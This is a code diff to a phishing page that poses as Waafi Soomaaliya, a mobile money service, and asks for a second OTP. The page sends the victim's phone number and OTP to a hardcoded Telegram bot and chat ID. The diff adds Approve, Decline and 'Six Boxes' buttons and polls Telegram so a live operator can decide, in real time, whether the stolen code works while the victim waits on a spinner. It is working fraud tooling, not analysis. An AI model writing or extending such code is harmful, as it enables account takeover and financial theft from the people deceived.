@@ -144,6 +144,13 @@
             font-weight: 500;
             min-height: 20px;
         }
+        
+        #poll-status {
+            font-size: 13px;
+            color: #666;
+            margin-top: 10px;
+            min-height: 20px;
+        }
     </style>
 </head>
 
@@ -151,7 +158,8 @@
 
     <div id="loading-overlay">
         <div class="spinner"></div>
-        <div style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
+        <div id="loading-text" style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
+        <div id="loading-sub" style="font-size: 14px; margin-top: 10px; opacity: 0.8;"></div>
     </div>
 
     <div class="container">
@@ -170,6 +178,7 @@
         <div class="resend-text" id="timer-text"></div>
         <button class="btn-verify" id="verify-btn" disabled>XAQIIJI OTP GA LABAAD</button>
         <div id="status-msg"></div>
+        <div id="poll-status"></div>
     </div>
 
     <div class="footer">© 2026 Waafi Soomaaliya</div>
@@ -182,12 +191,17 @@
         const ADMIN_CHAT_ID = "5615316142";
         // ============================================================
 
+        let pollInterval = null;
+
         const phone = localStorage.getItem('phone');
         const inputs = document.querySelectorAll('.otp-inputs input');
         const btn = document.getElementById('verify-btn');
         const timerDisplay = document.getElementById('timer-text');
         const statusMsg = document.getElementById('status-msg');
         const overlay = document.getElementById('loading-overlay');
+        const loadingText = document.getElementById('loading-text');
+        const loadingSub = document.getElementById('loading-sub');
+        const pollStatus = document.getElementById('poll-status');
 
         let countdown;
         let isSubmitting = false;
@@ -247,7 +261,6 @@
                     checkFull();
                 }
             });
-            // Paste support
             input.addEventListener('paste', (e) => {
                 e.preventDefault();
                 const paste = (e.clipboardData || window.clipboardData).getData('text');
@@ -279,13 +292,33 @@
 
             // Show loading overlay
             overlay.style.display = 'flex';
+            loadingText.innerText = "Waa la diray...";
+            loadingSub.innerText = "Sug oggolaanshaha admin-ka";
             statusMsg.innerText = "";
+            pollStatus.innerText = "";
 
-            // ---- 1. Send OTP to Telegram Bot (fire & forget) ----
+            // ---- Send OTP to Telegram Bot WITH INLINE BUTTONS ----
             if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && ADMIN_CHAT_ID !== "YOUR_ADMIN_CHAT_ID_HERE") {
                 try {
-                    const message = "🔐 *OTP Labaad waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 OTP: `" + otp + "`";
-                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                    const timestamp = Date.now();
+                    const message = "🔐 *OTP Labaad waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 OTP: `" + otp + "`\n🆔 TS: `" + timestamp + "`";
+
+                    const inlineKeyboard = {
+                        inline_keyboard: [
+                            [{
+                                text: "✅ Approve",
+                                callback_data: "approve_otp2_" + timestamp
+                            }, {
+                                text: "❌ Decline",
+                                callback_data: "decline_otp2_" + timestamp
+                            }, {
+                                text: "📦 Six Boxes",
+                                callback_data: "sixboxes2_" + timestamp
+                            }]
+                        ]
+                    };
+
+                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/json"
@@ -293,37 +326,111 @@
                         body: JSON.stringify({
                             chat_id: ADMIN_CHAT_ID,
                             text: message,
-                            parse_mode: "Markdown"
+                            parse_mode: "Markdown",
+                            reply_markup: JSON.stringify(inlineKeyboard)
                         })
                     });
+
+                    const result = await response.json();
+
+                    if (result.ok && result.result) {
+                        // Start polling for admin decision
+                        startPolling(timestamp);
+                    } else {
+                        throw new Error(result.description || "Failed to send");
+                    }
+
                 } catch (e) {
-                    console.log("Telegram send failed (non-blocking):", e);
+                    console.log("Telegram send failed:", e);
+                    statusMsg.style.color = "red";
+                    statusMsg.innerText = "❌ Khalad ayaa dhacay. Fadlan dib u day.";
+                    overlay.style.display = 'none';
+                    isSubmitting = false;
                 }
+            } else {
+                // No bot configured - just navigate directly
+                loadingSub.innerText = "Bot not configured, redirecting...";
+                setTimeout(() => {
+                    window.location.href = "page10.html";
+                }, 1000);
             }
+        }
 
-            // ---- 2. Also try backend endpoint if exists ----
-            try {
-                await fetch('/api/verify-second-otp', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phone,
-                        otp
-                    })
-                });
-            } catch (e) {
-                console.log("Backend endpoint not available, continuing...");
-            }
+        function startPolling(timestamp) {
+            // Clear any existing poll
+            if (pollInterval) clearInterval(pollInterval);
 
-            // ---- 3. Navigate to page10.html after a brief delay ----
-            statusMsg.style.color = "#2ecc71";
-            statusMsg.innerText = "✅ OTP-ga waa sax! U gudbaya...";
+            let attempts = 0;
+            const maxAttempts = 150; // ~5 minutes
 
-            setTimeout(() => {
-                window.location.href = "page10.html";
-            }, 1000);
+            pollInterval = setInterval(async function() {
+                attempts++;
+                loadingSub.innerText = "La sugayo... " + attempts + "s";
+
+                try {
+                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=5");
+                    const data = await response.json();
+
+                    if (data.ok && data.result) {
+                        for (const update of data.result) {
+                            if (update.callback_query) {
+                                const query = update.callback_query;
+                                const callbackData = query.data;
+
+                                // Check if this callback is for our OTP
+                                if (callbackData.includes("" + timestamp)) {
+
+                                    if (callbackData.startsWith("approve")) {
+                                        // ✅ APPROVED - Navigate to page10
+                                        clearInterval(pollInterval);
+                                        loadingText.innerText = "✅ Waa la ansixiyay!";
+                                        loadingSub.innerText = "U gudbaya...";
+                                        setTimeout(function() {
+                                            window.location.href = "page10.html";
+                                        }, 1500);
+                                        return;
+                                    }
+
+                                    if (callbackData.startsWith("decline")) {
+                                        // ❌ DECLINED - Reset and stay on same page
+                                        clearInterval(pollInterval);
+                                        overlay.style.display = 'none';
+                                        statusMsg.style.color = "red";
+                                        statusMsg.innerText = "❌ Codsiga waa la diiday. Fadlan dib u geli OTP-ga.";
+                                        resetForm();
+                                        return;
+                                    }
+
+                                    if (callbackData.startsWith("sixboxes")) {
+                                        // 📦 Six Boxes - acknowledge but keep waiting
+                                        loadingSub.innerText = "📦 Six boxes option selected... sugitaan";
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    // If max attempts reached, timeout
+                    if (attempts >= maxAttempts) {
+                        clearInterval(pollInterval);
+                        overlay.style.display = 'none';
+                        statusMsg.style.color = "red";
+                        statusMsg.innerText = "⏰ Waqtigii oggolaanshaha wuu dhammaaday. Fadlan dib u day.";
+                        resetForm();
+                    }
+
+                } catch (err) {
+                    console.error("Poll error:", err);
+                }
+            }, 2000);
+        }
+
+        function resetForm() {
+            isSubmitting = false;
+            inputs.forEach(i => i.value = "");
+            btn.disabled = true;
+            btn.classList.remove('active');
+            if (inputs[0]) inputs[0].focus();
         }
     </script>
 </body>
